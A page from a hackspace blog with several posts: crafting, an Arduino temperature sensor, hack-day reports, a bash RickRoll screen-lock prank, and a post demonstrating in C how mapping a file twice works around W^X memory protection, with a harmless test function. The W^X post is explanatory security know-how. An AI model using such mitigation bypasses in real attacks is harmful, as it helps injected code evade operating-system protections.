<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8"/>
<title>Can&#039;t Hack, Won&#039;t Hack | Page 2</title>
<link rel="profile" href="//gmpg.org/xfn/11"/>
<link rel="stylesheet" type="text/css" media="all" href="//canthack.org/wp-content/themes/twentyten/style.css"/>
<link rel="alternate" type="application/rss+xml" title="Can&#039;t Hack, Won&#039;t Hack &raquo; Feed" href="//canthack.org/wp-content/plugins/really-static/static/feed/"/>
<link rel="alternate" type="application/rss+xml" title="Can&#039;t Hack, Won&#039;t Hack &raquo; Comments Feed" href="//canthack.org/wp-content/plugins/really-static/static/comments/feed/"/>
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/canthack.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.2"}};
			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style type="text/css">img.wp-smiley,img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-0.1em!important;background:none!important;padding:0!important;}</style>
<link rel='stylesheet' id='fancybox-css' href='//canthack.org/wp-content/plugins/fancyboxify/fancybox/fancybox.css?ver=1.3.4' type='text/css' media='all'/>
<link rel='stylesheet' id='jetpack_css-css' href='//canthack.org/wp-content/plugins/jetpack/css/jetpack.css?ver=3.5.3' type='text/css' media='all'/>
<script type='text/javascript' src='//canthack.org/wp-includes/js/jquery/jquery.js?ver=1.11.2'></script>
<script type='text/javascript' src='//canthack.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.fancybox.pack.js?ver=1.3.4'></script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.easing.pack.js?ver=1.3'></script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.mousewheel.pack.js?ver=3.0.4'></script>
<meta name="generator" content="WordPress 4.2.2"/>
<script type="text/javascript">
	jQuery(document).ready(function($){
		var imglinks = $('a[href$=".jpg"], a[href$=".jpeg"], a[href$=".png"], a[href$=".gif"], a[href$=".JPG"], a[href$=".JPEG"], a[href$=".PNG"], a[href$=".GIF"]');

		imglinks.each(function(){ 
			if ( $(this).attr('rel').indexOf("fancybox") != -1 ) {
				$(this).fancybox({
					'transitionIn'	:	'none',
					'transitionOut'	:	'none',
					'titlePosition'	:	'over',
					'titleFormat'	:	function(title, currentArray, currentIndex, currentOpts){
									return '<span id="fancybox-title-over">(' + (currentIndex + 1) + ' / ' + currentArray.length + (title.length ? ')&nbsp;&nbsp;' + title : ')') + '</span>';
								},
					'title'		:	$(this).find("img").first().attr("title")	// Extract title from the first <img> element within the <a>
				});
			}
		});
	});
</script><meta name="really-static looptest" content="testtesttest"/>
 
<meta property="og:type" content="website"/>
<meta property="og:title" content="Can&#039;t Hack, Won&#039;t Hack"/>
<meta property="og:url" content="/"/>
<meta property="og:site_name" content="Can&#039;t Hack, Won&#039;t Hack"/>
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg"/>
<meta property="og:locale" content="en_US"/>
<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>
<body class="home blog paged paged-2">
<div id="wrapper" class="hfeed">
<div id="header">
<div id="masthead">
<div id="branding" role="banner">
<h1 id="site-title">
<span>
<a href="/" title="Can&#039;t Hack, Won&#039;t Hack" rel="home">Can&#039;t Hack, Won&#039;t Hack</a>
</span>
</h1>
<div id="site-description"></div>
<img src="//canthack.org/uploads/sltrain.jpg" width="940" height="198" alt=""/>
</div> 
<div id="access" role="navigation">
<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
<div class="menu"><ul><li><a href="/">Home</a></li><li class="page_item page-item-2"><a href="/about/">About</a></li><li class="page_item page-item-106"><a href="/future/">Future</a></li><li class="page_item page-item-247"><a href="/rules/">Rules</a></li></ul></div>
</div> 
</div> 
</div> 
<div id="main">
<div id="container">
<div id="content" role="main">
<div id="nav-above" class="navigation">
<div class="nav-previous"><a href="/page/3/index.html"><span class="meta-nav">&larr;</span> Older posts</a></div>
<div class="nav-next"><a href="/">Newer posts <span class="meta-nav">&rarr;</span></a></div>
</div> 
<div id="post-1107" class="post-1107 post type-post status-publish format-standard hentry category-crafting tag-craft tag-fuse-beads tag-geeky tag-hama-bead tag-perler">
<h2 class="entry-title"><a href="/2012/03/hama-bead-madness/" rel="bookmark">Hama bead madness&#8230;</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2012/03/hama-bead-madness/" title="19:30" rel="bookmark"><span class="entry-date">March 29, 2012</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/han/" title="View all posts by Han">Han</a></span> </div> 
<div class="entry-content">
<p>Well it&#8217;s been a long time since an update on hackery, and a lot has happened! So here goes, an attempt at covering the last 3 or so months&#8230;</p>
<p>I found a new hobby! Crafty but not too difficult (unlike sewing/knitting/jewellery making malarkey). I&#8217;m not very patient, and I find fiddly things too&#8230;well&#8230;fiddly! So I&#8217;ve found something on my level. According to Wikipedia, <em>&#8220;plastic fusible beads are also known as Perler Beads, or called &#8220;melty beads&#8221; by young children. These small colorful beads can be placed on a solid plastic-backed peg array to form designs and then melted together with a clothes iron; alternatively, they can be strung into necklaces or bracelets, or woven into keychains. Fusible beads come in many colors and degrees of transparency/opacity, including varieties that glow in the dark or have internal glitter; peg boards come in various shapes and several geometric patterns.&#8221;</em></p>
<p>The main thing to note here is that this is usually a hobby for children. This means that it&#8217;s not fiddly (yippee!) and you don&#8217;t need to be very patient (hooray!!) so it suits me down to the ground.</p>
<p>I started off making coasters, by copying patterns I found online and filling in the space around the pattern and making it into a square. I then began going &#8220;freestyle&#8221; and making up patterns, as well as interpreting cross-stitch patterns to make other designs. Then I came across how much 8-bit art has been made with these beads. There&#8217;s an amazing amount!</p>
<div id="attachment_1109" style="width: 310px" class="wp-caption aligncenter"><a href="/2012/03/hama-bead-madness/dscf2455/" rel="attachment wp-att-1109"><img class="size-medium wp-image-1109 " title="Some of my hama bead creations" src="//canthack.org/uploads/DSCF2455-300x168.jpg" alt="Some hama bead creations" width="300" height="168"/></a><p class="wp-caption-text">Some of my hama bead creations</p></div>
<p>I then had a go at turning my creations into necklaces, brooches and magnets, which worked well. I have since sold some of them at various craft fairs, and have plans for giant 8-bit art as well as more different types of wearable geekery <img src="//canthack.org/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;"/></p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/crafting/" rel="category tag">Crafting</a> </span>
<span class="meta-sep">|</span>
<span class="tag-links">
<span class="entry-utility-prep entry-utility-prep-tag-links">Tagged</span> <a href="/tag/craft/" rel="tag">craft</a>, <a href="/tag/fuse-beads/" rel="tag">fuse beads</a>, <a href="/tag/geeky/" rel="tag">geeky</a>, <a href="/tag/hama-bead/" rel="tag">Hama bead</a>, <a href="/tag/perler/" rel="tag">perler</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2012/03/hama-bead-madness/#comments">1 Comment</a></span>
</div> 
</div> 
<div id="post-1079" class="post-1079 post type-post status-publish format-standard hentry category-programming category-unix">
<h2 class="entry-title"><a href="/2011/12/rickrolling-the-trolls/" rel="bookmark">RickRolling The Trolls</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/12/rickrolling-the-trolls/" title="20:24" rel="bookmark"><span class="entry-date">December 21, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/mex/" title="View all posts by Mex">Mex</a></span> </div> 
<div class="entry-content">
<p><a href="/uploads/rick.jpg" rel="fancybox-1079"><img src="//canthack.org/uploads/rick-300x150.jpg" alt="" title="rickroll" width="300" height="150" class="alignright size-medium wp-image-1100"/></a>This post is inspired by a video a friend (Reashlin) sent to me (embedded below). In their company it is policy to lock computers when users are away from them, and if a machine is left unlocked it is customary to tell the supervisor in a &#8220;friendly&#8221; email from the account of the person in who left their machine unlocked.</p>
<p>Knowing this, Reashlin&#8217;s colleague wrote a C# application that leaves the computer running whatever it was before until the mouse is moved, when it switches to a full screen RickRoll video with the machine locked.</p>
<p>A whole C# application to do this seemed a bit much, so I distilled the whole thing into the following 4 line bash script. The script is quite simple. It simply waits for input from /dev/input/mice then spawns full screen mplayer in the background, and xtrlock in the foreground. xtrlock is a handy little program that captures all keyboard/mice events until the users password is entered, a bit like a transparent xlock. There is an issue with this script if the user is proficient in keyboard short-cuts they might never touch the mouse&#8230; but that&#8217;s something for another day.</p>
<p>If the others at canthack.org try and do <a href="/uploads/aliastroll.jpg" rel="fancybox-1079">this</a> to me again they will be getting a surprise (well not that much; they do read this after all).</p>
<pre class="brush: bash; title: ; notranslate" title="">
#!/bin/bash
sudo cat /dev/input/mice | read -n 1
mplayer -fs rick.flv &amp;
xtrlock
</pre>
<p><span class='embed-youtube' style='text-align:center; display: block;'><iframe class='youtube-player' type='text/html' width='640' height='390' src='http://www.youtube.com/embed/Bps8yTw0W5c?version=3&#038;rel=1&#038;fs=1&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;wmode=transparent' frameborder='0' allowfullscreen='true'></iframe></span></p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/programming/" rel="category tag">Programming</a>, <a href="/category/unix/" rel="category tag">Unix</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/12/rickrolling-the-trolls/#comments">2 Comments</a></span>
</div> 
</div> 
<div id="post-429" class="post-429 post type-post status-publish format-standard hentry category-arduino category-hardware">
<h2 class="entry-title"><a href="/2011/11/a-temperature-sensor-with-arduino/" rel="bookmark">A Temperature Sensor with Arduino</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/11/a-temperature-sensor-with-arduino/" title="18:45" rel="bookmark"><span class="entry-date">November 13, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/tris/" title="View all posts by Tris">Tris</a></span> </div> 
<div class="entry-content">
<p>After getting the <a title="Arduino" href="http://arduino.cc/" target="_blank">Arduino</a> Uno for Christmas last year, I set about doing what every geek does after getting bored of the usual blinky blinky pin 13 stuff, and started thinking about what I could do with it that was <em>cool</em>, and maybe even <em>useful</em>.</p>
<p>I decided to make a temperature sensor, using the cheap and easy-to-use <a title="LM35 Temperature Sensor" href="http://www.national.com/mpf/LM/LM35.html#Overview" target="_blank">LM35</a> integrated circuit, which is a compact package that looks just like a transistor.</p>
<div id="attachment_1039" style="width: 160px" class="wp-caption alignleft"><a href="/2011/11/a-temperature-sensor-with-arduino/lm35/" rel="attachment wp-att-1039"><img class="size-thumbnail wp-image-1039" title="LM35" src="//canthack.org/uploads/lm35-150x150.jpg" alt="LM35" width="150" height="150"/></a><p class="wp-caption-text">LM35</p></div>
<p>It offers a linear 10mV per degree C voltage change with temperature and so requires minimal mathematics to covert the analogue input into a temperature reading.</p>
<p>The current temperature, and a running minimum and maximum are displayed on an LCD display (using the <a title="Arduino LiquidCrystal Library" href="http://arduino.cc/en/Reference/LiquidCrystal" target="_blank">LiquidCrystal Library</a>), with the pushbutton allowing the maximum and minimum to be reset. The temperatures are calculated using a circular buffer providing a running mean value over 10 samples.</p>
<div id="attachment_1025" style="width: 310px" class="wp-caption alignright"><a href="/2011/11/a-temperature-sensor-with-arduino/sd1/" rel="attachment wp-att-1025"><img class="size-medium wp-image-1025" title="SD card hack" src="//canthack.org/uploads/sd1-300x160.jpg" alt="SD card hack" width="300" height="160"/></a><p class="wp-caption-text">SD card hack</p></div>
<p>The project also writes the temperature values to an SD card using the <a title="Arduino SD Library" href="http://arduino.cc/en/Reference/SD" target="_blank">SD Library</a>, which was attached via an awesome hack I came up with involving soldering a pin header directly to it, although in this case it&#8217;s a micro-SD adaptor to allow for changing the card more easily. The pinout is almost exactly lined up to make this hack work!</p>
<p>&nbsp;</p>
<div id="attachment_1030" style="width: 310px" class="wp-caption alignleft"><a href="/2011/11/a-temperature-sensor-with-arduino/circuit/" rel="attachment wp-att-1030"><img class="size-medium wp-image-1030" title="Temperature Sensor" src="//canthack.org/uploads/circuit-300x279.jpg" alt="Temperature Sensor" width="300" height="279"/></a><p class="wp-caption-text">Temperature Sensor</p></div>
<p>What I like about this project is that it combines all the usual cool things a beginner would want to do with their Arduino. Sensor reading, LCD screen output, SD card read/write, and button capture (which will be done with an interrupt, when I get a chance to do it).</p>
<p>The code, and Fritzing schematic, can be found on my <a title="ArduinoTemperatureSensor" href="https://github.com/tristan2468/ArduinoTemperatureSensor" target="_blank">GitHub page</a>.</p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/hardware/arduino/" rel="category tag">Arduino</a>, <a href="/category/hardware/" rel="category tag">Hardware</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/11/a-temperature-sensor-with-arduino/#respond">Leave a comment</a></span>
</div> 
</div> 
<div id="post-973" class="post-973 post type-post status-publish format-standard hentry category-events">
<h2 class="entry-title"><a href="/2011/11/11-11-11/" rel="bookmark">11/11/11</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/11/11-11-11/" title="23:45" rel="bookmark"><span class="entry-date">November 11, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/omer/" title="View all posts by Omer">Omer</a></span> </div> 
<div class="entry-content">
<h2>Lest we forget</h2>
<p>To celebrate armistice day, the last binary day for another 88 years and 51 days, and the joy of the bodge, CantHack is at it again!</p>
<p>We have TI hacking, watch designing, plenty of Arduinos, crafting, and software packaging. There was also beer (and Lemsip for Omer).</p>
<h2>Hack in pictures</h2>
<div id='gallery-1' class='gallery galleryid-973 gallery-columns-2 gallery-size-thumbnail'><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0521.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0521-150x150.jpg" class="attachment-thumbnail" alt="Crucial details for the night." aria-describedby="gallery-1-974"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-974'>
Crucial details for the night.
</dd></dl><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0523.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0523-150x150.jpg" class="attachment-thumbnail" alt="Semi-circle of hackers" aria-describedby="gallery-1-975"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-975'>
Semi-circle of hackers
</dd></dl><br style="clear: both"/><dl class='gallery-item'>
<dt class='gallery-icon portrait'>
<a href='/uploads/IMG_0526-e1321045017783.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0526-e1321045017783-150x150.jpg" class="attachment-thumbnail" alt="Tris, building an Arduino temperature logger" aria-describedby="gallery-1-976"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-976'>
Tris, building an Arduino temperature logger
</dd></dl><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0535.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0535-150x150.jpg" class="attachment-thumbnail" alt="Ed, creating footprints in Designspark" aria-describedby="gallery-1-978"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-978'>
Ed, creating footprints in Designspark
</dd></dl><br style="clear: both"/><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0536.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0536-150x150.jpg" class="attachment-thumbnail" alt="Mitzi, observing." aria-describedby="gallery-1-979"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-979'>
Mitzi, observing.
</dd></dl><dl class='gallery-item'>
<dt class='gallery-icon portrait'>
<a href='/uploads/IMG_0538-e1321047452513.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0538-e1321047452513-150x150.jpg" class="attachment-thumbnail" alt="Deb, crafting." aria-describedby="gallery-1-980"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-980'>
Deb, crafting.
</dd></dl><br style="clear: both"/><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0539.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0539-150x150.jpg" class="attachment-thumbnail" alt="Ladies in the craft room" aria-describedby="gallery-1-981"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-981'>
Ladies in the craft room
</dd></dl><dl class='gallery-item'>
<dt class='gallery-icon portrait'>
<a href='/uploads/IMG_0537-e1321045463808.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0537-e1321045463808-150x150.jpg" class="attachment-thumbnail" alt="Edd, playing with a TI calculator" aria-describedby="gallery-1-983"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-983'>
Edd, playing with a TI calculator
</dd></dl><br style="clear: both"/><dl class='gallery-item'>
<dt class='gallery-icon portrait'>
<a href='/uploads/Screenshot-hgdc-x-0.5.0.png'><img width="150" height="150" src="//canthack.org/uploads/Screenshot-hgdc-x-0.5.0-150x150.png" class="attachment-thumbnail" alt="A selection of songs played" aria-describedby="gallery-1-982"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-982'>
A selection of songs played
</dd></dl><dl class='gallery-item'>
<dt class='gallery-icon landscape'>
<a href='/uploads/IMG_0527.jpg'><img width="150" height="150" src="//canthack.org/uploads/IMG_0527-150x150.jpg" class="attachment-thumbnail" alt="HGD! (check out http://hgd.theunixzoo.co.uk/)" aria-describedby="gallery-1-977"/></a>
</dt>
<dd class='wp-caption-text gallery-caption' id='gallery-1-977'>
HGD! (check out http://hgd.theunixzoo.co.uk/)
</dd></dl><br style="clear: both"/>
</div>
<p><a href="/uploads/aliastroll.jpg" rel="fancybox-973"><img class="aligncenter size-medium wp-image-1013" title="aliastroll" src="//canthack.org/uploads/aliastroll-300x200.jpg" alt="" width="300" height="200"/></a></p>
<p style="text-align: center;"><strong>PROTIP:</strong> *Never* leave your laptop unattended at a hackathon 😉</p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/events/" rel="category tag">Events</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/11/11-11-11/#respond">Leave a comment</a></span>
</div> 
</div> 
<div id="post-896" class="post-896 post type-post status-publish format-standard hentry category-programming category-software category-unix">
<h2 class="entry-title"><a href="/2011/11/wx/" rel="bookmark">W^X</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/11/wx/" title="16:49" rel="bookmark"><span class="entry-date">November 8, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/static-void/" title="View all posts by static-void">static-void</a></span> </div> 
<div class="entry-content">
<p>Today I was reading about self-modifying code. I knew some things already &#8211; for example it is used sometimes as &#8216;camouflage&#8217; by malicious programs to cover their intent, by JIT compilers, and for optimising loop evaluation functions. Suppose you have a number of functions that are very similar except for a couple of instructions used for some sort of comparison or evaluation. Instead of having several almost identical functions in memory, one option is to simply over-write the evaluation instructions with a slightly different piece of code every time the function is used.</p>
<p>However, in general, because of it&#8217;s usefulness in malicious programs, self modifying code is a bit of a security problem for operating systems. For this reason modern operating systems do not allow memory pages to be both writeable and executable. This is known as W^X &#8211; write XOR execute, meaning a page of memory is writable or executable, but never both.</p>
<p>The main reason for this post is an interesting work-around that Edd and I discovered today. It turns out that it is possible to map a file into memory twice. When a file is mapped into memory, the permissions are set at the same time as it is mapped. Given this, you can be a bit sneaky, and map a file as writeable, then map it again as executable. This will give you two pointers to different areas of your programs virtual address space, but both referencing the same file. You can then write some code to the file using one pointer, and execute it using the other.</p>
<p>As an example I created a little test C program with a single function in it as follows:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
int
add(int a, int b)
{
        return a+b;
}

main() {
        int a = add(12, 2);
}
</pre>
<p>I then built this with debug symbols and no compiler optimisation (since this program doesn&#8217;t do anything, with optimisations turned on the add function would disappear completely):</p>
<pre class="brush: cpp; title: ; notranslate" title="">
gcc testcode.c -o testcode -g
</pre>
<p>This function is nothing really to do with the exploit <em>per se</em>. The plan is:</p>
<ul>
<li>Create a file</li>
<li>Map the file into memory as writeable</li>
<li>Copy the add function from the above code into this writeable memory (ending up in the file)</li>
<li>Map the file into memory as executable</li>
<li>Assign a function pointer to point to the executable memory</li>
<li>Execute the add function that we just wrote into memory using the function pointer</li>
</ul>
<p>To do this, the code below is used:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
#include &lt;sys/mman.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define MEM_MAP_FILE &quot;/tmp/a&quot;
#define TESTCODE_FILE &quot;testcode&quot;
#define TESTCODE_SIZE 8427
#define FUNCTION_ADDR 0x394
#define FUNCTION_SIZE 0xE

int
main(void)
{
	void *p1, *p2, *p3;
	int fd, fd2;
	FILE *f, *f2;
	int (*add)(int a, int b);

	/* Create/open the file */
	f = fopen(MEM_MAP_FILE, &quot;w+&quot;);
	fd = fileno(f);

	/* Make some space in the file to copy the function in */
	lseek(fd, FUNCTION_SIZE, SEEK_SET);
	/* Have to write to actually make the space */
	write(fd, &quot;&quot;, 1);

	/* Map file as write */
	p1 = mmap(0, FUNCTION_SIZE, PROT_WRITE, MAP_SHARED, fd, 0);

	/* Open test code */
	f2 = fopen(TESTCODE_FILE, &quot;r&quot;);
	fd2 = fileno(f2);

	/* mmap the test code */
	p3 = mmap(0, TESTCODE_SIZE, PROT_READ, MAP_SHARED, fd2, 0);

	/* Copy function into writeable memory */
	memcpy(p1, p3 + FUNCTION_ADDR, FUNCTION_SIZE);

	/* Map the file as executable */
	p2 = mmap(0, FUNCTION_SIZE, PROT_EXEC, MAP_SHARED, fd, 0);

	/* Make function pointer point to the executable memory*/
	add = p2;

	/* Execute function we just wrote! */
	printf(&quot;Result = %d\n&quot;, (*add)(1, 2));
}
</pre>
<p>There are a couple of things to note. First, this code does no checks on return values of mmap, fopen etc. This is purely for readability on this blog! Second, the 3 #define pre-processor macros at the start of the program must be set up for the function that is being copied in from testcode, in our case &#8216;add&#8217;. The first is the size of the testcode executable, which can be found with &#8220;ls -l&#8221;. The second is the offset of the add function within the executable, and the third the size of the add function. The easiest way to get these last two is probably with objdump. We use &#8220;objdump -d testcode&#8221; to disassemble the file, and then scroll through until we see the add function, which will look something like:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
08048394 &lt;add&gt;:
 8048394:	55                   	push   %ebp
 8048395:	89 e5                	mov    %esp,%ebp
 8048397:	8b 45 0c             	mov    0xc(%ebp),%eax
 804839a:	8b 55 08             	mov    0x8(%ebp),%edx
 804839d:	8d 04 02             	lea    (%edx,%eax,1),%eax
 80483a0:	5d                   	pop    %ebp
 80483a1:	c3                   	ret
</pre>
<p>Unfortunately objdump relocates the file before disassembly. Therefore, we only use the last 3 digits of the address. So in this case, the add function starts at offset 394 and ends at 3a2 (the last instruction, ret, is only 1 byte long, and starts at 3a1). So the size of the function is 3a2-394 = E.</p>
<p>Running the executable afterwards will now result in:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
Result = 3
</pre>
<p>So we have managed to write to some memory and then execute what we wrote, working around the W^X feature!</p>
<p>However, this isn&#8217;t as bad as it might seem. There are actually other ways to get around W^X, for example the mprotect system call. And this doesn&#8217;t really allow you to elevate privileges very easily. You might be able to write self-modifying code, but you can&#8217;t, for example, overwrite code of a process already running as root, make the text area of an address space writable, the data area executable, or modify a file such as /bin/ls (because you still don&#8217;t have write permission to the file).</p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/programming/" rel="category tag">Programming</a>, <a href="/category/software/" rel="category tag">Software</a>, <a href="/category/unix/" rel="category tag">Unix</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/11/wx/#comments">1 Comment</a></span>
</div> 
</div> 
<div id="post-872" class="post-872 post type-post status-publish format-standard hentry category-events">
<h2 class="entry-title"><a href="/2011/10/cant-hack-medhack-a-trip-to-medway-innovation-centre/" rel="bookmark">CantHack..MedHack! A trip to Medway Innovation Centre</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/10/cant-hack-medhack-a-trip-to-medway-innovation-centre/" title="19:51" rel="bookmark"><span class="entry-date">October 5, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/han/" title="View all posts by Han">Han</a></span> </div> 
<div class="entry-content">
<p><a href="/2011/10/cant-hack-medhack-a-trip-to-medway-innovation-centre/dsc_0866-2/" rel="attachment wp-att-878"><img class="size-full wp-image-878 alignright" title="Coding" src="//canthack.org/uploads/DSC_08661.jpg" alt="Coding" width="238" height="162"/></a>At the end of August, we were kindly invited to visit, and make use of the facilities at, the <a title="Medway Innovation Centre" href="http://innovationcentremedway.co.uk/" target="_blank">Medway Innovation Centre</a>. We had met a member of Medway Makerspace at <a title="BarCamp Canterbury" href="http://barcampcanterbury.blogspot.com/" target="_blank">BarCamp Canterbury</a> earlier in the year, and we were intrigued to see the venue that they use for hack meetups. We were all suitably impressed with the amazing facilities, and the guys there were so accommodating (even to those of us who were crafting rather than hacking!). We were given the use of two of their rooms and this kitchen (key for refuelling with tea &#8211; good work on the tea-making, Rob) and spent a good twelve hours making and doing.</p>
<p>The room I was in was affectionately known as &#8220;Mex&#8217;s sweatshop&#8221;.  Here, I was employed to sew Mex&#8217;s <a title="Tinkersoc" href="http://tinkersoc.org/" target="_blank">Tinkersoc</a> t-shirt, ready for him to wear at the University of Kent Freshers&#8217; Fair.  He stencilled the logo on the t-shirt, and I sewed EL wire onto it in the shape of a transistor.  I covered the parts that didn&#8217;t need to light up with black electrical tape, and soon it was complete.  Sadly there are no action shots of it!</p>
<p><img class="size-full wp-image-877 alignleft" title="Crafty goodness" src="//canthack.org/uploads/DSCF1998.jpg" alt="Crafty goodness" width="280" height="158"/></p>
<p>I then moved on to make some things from felt under the instruction of Debora (a felting pro). Marianne copied a picture of Shaun the Sheep for me onto some paper, and I used it as a guide to cutting out pieces of felt. I went on to make a Sonic the Hedgehog (without using a template, hence a tad wonky) and a bracelet made of buttons, a necklace mainly made of buttons, and fixed an old heart-shaped necklace. Debora made the troll, Pacman and ghost, button ring and flower hairclip. Marianne made the keyhole necklace and Mex wore the hairclips! All in all it was a really fun and productive day. Just wish the place was nearer then we could join and hack away there as often as we wanted!</p>
<p>&nbsp;</p>
</div> 
<div class="entry-utility">
<span class="cat-links">
<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/events/" rel="category tag">Events</a> </span>
<span class="meta-sep">|</span>
<span class="comments-link"><a href="/2011/10/cant-hack-medhack-a-trip-to-medway-innovation-centre/#respond">Leave a comment</a></span>
</div> 
</div> 
<div id="post-855" class="post-855 post type-post status-publish format-standard hentry category-events category-programming">
<h2 class="entry-title"><a href="/2011/09/hgdc-x-a-cross-platform-native-hgd-client/" rel="bookmark">hgdc-x. A Cross-Platform, Native hgd Client.</a></h2>
<div class="entry-meta">
<span class="meta-prep meta-prep-author">Posted on</span> <a href="/2011/09/hgdc-x-a-cross-platform-native-hgd-client/" title="15:34" rel="bookmark"><span class="entry-date">September 20, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="/author/tris/" title="View all posts by Tris">Tris</a></span> </div> 
<div class="entry-content">
<p>At Can&#8217;t Hack&#8217;s recent Medway Hack day, which took place at the Medway Hackspace, I decided to work on a new desktop /GUI client for the <a title="HGD 0.4.1 out now!" href="/2011/07/hgd-0-4-1/" target="_blank">hgd </a>music server. The current crop of hgd clients does not so far include an actively maintained desktop GUI, so it was a great opportunity to provide one, and seeing as we planned to (and did) hack for 12 hours straight &#8211; there was plenty of time with which to get something reasonable implemented!</p>
